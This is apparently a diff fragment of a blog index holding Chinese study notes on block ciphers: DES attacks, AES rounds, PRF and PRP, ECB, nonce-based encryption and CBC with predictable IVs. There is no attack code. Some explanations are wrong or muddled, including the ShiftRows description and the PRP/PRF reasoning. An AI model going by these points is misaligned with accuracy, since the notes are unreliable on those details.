+<h4 id="2-3-关于DES的安全性（这块主要是想要说不要自己创建密码）"><a href="#2-3-关于DES的安全性（这块主要是想要说不要自己创建密码）" class="headerlink" title="2.3 关于DES的安全性（这块主要是想要说不要自己创建密码）"></a>2.3 关于DES的安全性（这块主要是想要说不要自己创建密码）</h4><h6 id="2-3-2-更多关于分组密码的攻击"><a href="#2-3-2-更多关于分组密码的攻击" class="headerlink" title="2.3.2 更多关于分组密码的攻击"></a>2.3.2 更多关于分组密码的攻击</h6><ul>
+<li><p>旁道攻击：根据运行的时间和电流分析秘钥的方法</p>
+</li>
+<li><p>错误攻击：最后一轮的错误攻击就可以暴露秘钥了</p>
+</li>
+</ul>
+<h3 id="3-AES"><a href="#3-AES" class="headerlink" title="3 AES"></a>3 AES</h3><h4 id="3-1-AES的构造"><a href="#3-1-AES的构造" class="headerlink" title="3.1 AES的构造"></a>3.1 AES的构造</h4><p>AES所使用的是一个代换置换网络，并不是feistel网络</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/29b53a1d-bbe0-4349-bb3c-873c66f6c3c9.png" alt="29b53a1d-bbe0-4349-bb3c-873c66f6c3c9"></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/9d51e19b-4532-40ee-9e7e-4cd424dc6917.png" alt="9d51e19b-4532-40ee-9e7e-4cd424dc6917"></p>
+<p>AES是将明文分成4* 4 *16的组，对于每一组进行三个操作：</p>
+<ul>
+<li><p>ByteSub：我们将当前的状态，即AES4*4看成是一个查询表格，表格中的每一个项都是查询时的索引</p>
+</li>
+<li><p>ShiftRows：将每一行的相应数据平移一下，第一行平移一个，第二行平移两个</p>
+</li>
+<li><p>MixColumns：应用线性变换，对每一列进行变换</p>
+</li>
+</ul>
+<h4 id="3-2-利用PRG构造PRF"><a href="#3-2-利用PRG构造PRF" class="headerlink" title="3.2 利用PRG构造PRF"></a>3.2 利用PRG构造PRF</h4><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/a26ae42f-7934-4c77-a840-dc8398f7f4ee.png" alt="a26ae42f-7934-4c77-a840-dc8398f7f4ee"></p>
+<h6 id="3-2-1-PRF转换原理"><a href="#3-2-1-PRF转换原理" class="headerlink" title="3.2.1 PRF转换原理"></a>3.2.1 PRF转换原理</h6><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/ef6cdca0-2a5b-49b9-878a-d851895f04a7.png" alt="ef6cdca0-2a5b-49b9-878a-d851895f04a7"></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/c793b5e3-0eb2-41e5-ae04-c224cda900d5.png" alt="c793b5e3-0eb2-41e5-ae04-c224cda900d5"></p>
+<p>关于为什么一个安全的PRP并不一定是一个安全的PRF：</p>
+<p>        <em>由于PRP的要求比较高，只能是满射。而PRF则没有任何要求，所以对于PRP来说它的安全性要求也比较低，而对于PRF来说，它必须不能单射的，上面这道题是单射的，所以只要看f(0)是否可能等于f(1)，两者就区分开了</em></p>
+<p>一个安全的PRP也是一个安全的PRF（在|X|足够大时成立）</p>
+<p><mark>引理：E是一个在（K,X）上的PRP，对于任何攻击者访问PRP最多Q个点的情况下满足：<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/70a467df-3598-41cf-bf1b-22302043a6a8.png" alt="70a467df-3598-41cf-bf1b-22302043a6a8"></mark></p>
+<hr>
+<p>以下的部分需要重新理出相关的结构：</p>
+<h4 id="4-使用one-time-keys去加密分组密码"><a href="#4-使用one-time-keys去加密分组密码" class="headerlink" title="4 使用one-time keys去加密分组密码"></a>4 使用one-time keys去加密分组密码</h4><h4 id="4-1-电子密码本"><a href="#4-1-电子密码本" class="headerlink" title="4.1 电子密码本"></a>4.1 电子密码本</h4><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/26b73de7-3ecd-4435-bc79-7b566304e606.png" alt="26b73de7-3ecd-4435-bc79-7b566304e606"></p>
+<p>存在一个问题：如果明文一样，则密文一样，则攻击者就可以根据密文相同知道明文相同。</p>
+<p>很容易知道，这个方法并不是语义安全的（关于语义安全需要再重新学一遍）：即可以明显区分具有相同的分组的明文和没有相同分组的明文。</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/49ec1b8d-d782-46c3-9b2f-dce62b174c23.png" alt="49ec1b8d-d782-46c3-9b2f-dce62b174c23"></p>
+<h3 id="5-同一秘钥多次加密"><a href="#5-同一秘钥多次加密" class="headerlink" title="5 同一秘钥多次加密"></a>5 同一秘钥多次加密</h3><h4 id="5-1-同一多次秘钥的语义安全"><a href="#5-1-同一多次秘钥的语义安全" class="headerlink" title="5.1 同一多次秘钥的语义安全"></a>5.1 同一多次秘钥的语义安全</h4><p>攻击者的能力：攻击者可以获得任何他选择的明文的密文</p>
+<p><em>为什么（这个要求的现实意义）：</em></p>
+<p><em>攻击者给Alice发送一个电子邮件，Alice将电子邮件加密并写到硬盘中，攻击者将硬盘偷走后，获得Alice的密文</em></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/2436aff1-2269-4c05-a37e-9875a8800216.png" alt="2436aff1-2269-4c05-a37e-9875a8800216"></p>
+<p>与流密码的安全性区别在于攻击者可以选择相关的密文。</p>
+<hr>
+<p>对于电子密码本这种加密模式，同一秘钥多次加密一定是不安全的：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/860ddc3b-3812-4368-97b8-205872452f64.png" alt="860ddc3b-3812-4368-97b8-205872452f64"></p>
+<p>即攻击者可以知道单独的m0的密文，则可以随便区分m0与m1的密文，不符合语义安全的定义</p>
+<h4 id="5-2-对于同一多次秘钥的改进（随机加密"><a href="#5-2-对于同一多次秘钥的改进（随机加密" class="headerlink" title="5.2 对于同一多次秘钥的改进（随机加密"></a>5.2 对于同一多次秘钥的改进（随机加密</h4><h6 id="5-2-1-随机加密"><a href="#5-2-1-随机加密" class="headerlink" title="5.2.1 随机加密"></a>5.2.1 随机加密</h6><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/3d5d6bc4-2cf4-40e2-8f6d-e77e25b01667.png" alt="3d5d6bc4-2cf4-40e2-8f6d-e77e25b01667"></p>
+<p>即m0是被加密成一组密文，从这一组密文中选取一个，即为最后的密文</p>
+<p>只要被加密成的那组密文空间足够大，不会重合，就不会产生明文相同最后加密出来的密文也相同的情况。 </p>
+<p>但由于一个密文被翻译成一组密文，所以密文长度一定会增加，这就导致开销的增大。</p>
+<h6 id="5-2-2-使用新鲜值加密"><a href="#5-2-2-使用新鲜值加密" class="headerlink" title="5.2.2 使用新鲜值加密"></a>5.2.2 使用新鲜值加密</h6><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/069d59f1-a48e-4f8a-9dcc-e42271de5ba1.png" alt="069d59f1-a48e-4f8a-9dcc-e42271de5ba1"></p>
+<p>这个值n是可以公开的，它不需要对攻击者保密，但是加密每一个明文时，必须保证不使用同一对（k,n）值。</p>
+<p>实现的方法可以是：</p>
+<ul>
+<li><p>值n是一个计数器：当发送方发送一个包，或者接收方接收到一个包时，计数器+1（接收方与发送方必须保持同步）</p>
+</li>
+<li><p>随机选取值，但必须要保证这个值得空间足够大，才能不重复（不需要协调n值）</p>
+</li>
+</ul>
+<p>对于采用新鲜值得加密方式的安全性（CPA安全性）：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/184c8bc4-b83e-4c62-9014-b6b5d3bfa018.png" alt="184c8bc4-b83e-4c62-9014-b6b5d3bfa018"></p>
+<p>攻击者选择加密的明文和新鲜值，只有一个要求新鲜值不能够选择相同的</p>
+<h4 id="5-2-CBC（密码分组链接模式）"><a href="#5-2-CBC（密码分组链接模式）" class="headerlink" title="5.2 CBC（密码分组链接模式）"></a>5.2 CBC（密码分组链接模式）</h4><h6 id="5-2-1-CBC的工作模式（基于随机IV的加密）"><a href="#5-2-1-CBC的工作模式（基于随机IV的加密）" class="headerlink" title="5.2.1 CBC的工作模式（基于随机IV的加密）"></a>5.2.1 CBC的工作模式（基于随机IV的加密）</h6><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/72d9ac9e-da9c-4a08-96b9-f5ac88bd817e.png" alt="72d9ac9e-da9c-4a08-96b9-f5ac88bd817e"></p>
+<p>IV是一个随机的初始向量 </p>
+<p>需要把IV包含在密文中，要包含这种加密中使用的随机性（但我不懂怎么把IV包含在密文中呢）</p>
+<p>对于CBC的求解方式：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/674d2c2b-31bd-4a9c-a9b2-fe32d2c35e38.png" alt="674d2c2b-31bd-4a9c-a9b2-fe32d2c35e38"></p>
+<p>带IV的CBC模式对选择明文攻击是语义安全的：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/8907d3e9-0464-41a4-92bb-30afdef00995.png" alt="8907d3e9-0464-41a4-92bb-30afdef00995"></p>
+<p>则CBC只有在<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/4a008848-6b5a-4762-bcfb-ac7396c38ff5.png" alt="4a008848-6b5a-4762-bcfb-ac7396c38ff5">情况下是语义安全的，限定了秘钥更换的频率</p>
+<h6 id="5-2-2-CBC的要求（IV必须是随机的，即不可预测的）"><a href="#5-2-2-CBC的要求（IV必须是随机的，即不可预测的）" class="headerlink" title="5.2.2 CBC的要求（IV必须是随机的，即不可预测的）"></a>5.2.2 CBC的要求（IV必须是随机的，即不可预测的）</h6><p>如果IV不是随机的，即攻击者根据已知的加密可以预测IV的值：</p>
+<p>则根据CPA语义安全性的要求，如果想要攻击他，我们得设法区分m0与m1的加密之后区别</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/9392f605-6ca4-472f-bab5-560626bf6876.png" alt="9392f605-6ca4-472f-bab5-560626bf6876"></p>
+<p><strong>这个挑战的意思是：（首先假设攻击者知道IV1的值）攻击者首先将明文设置为0，则0与当前状态的IV1异或，异或后加密 ，则将知道IV1加密后的结果，攻击者将下一次的明文选择为IV1与IV的异或，则攻击者可以直接区分IV1与IV2的区别</strong></p>
+<h6 id="5-2-3-CBC的工作模式（基于新鲜值的加密）"><a href="#5-2-3-CBC的工作模式（基于新鲜值的加密）" class="headerlink" title="5.2.3 CBC的工作模式（基于新鲜值的加密）"></a>5.2.3 CBC的工作模式（基于新鲜值的加密）</h6><p>在这个模式中IV被不随机但唯一的新鲜值所替代</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/7b502f22-075d-4f50-8b3a-6dfb63096517.png" alt="7b502f22-075d-4f50-8b3a-6dfb63096517"></p>
+]]></content>
+      <categories>
+        <category>密码学理论知识</category>
+      </categories>
   </entry>
 </search>
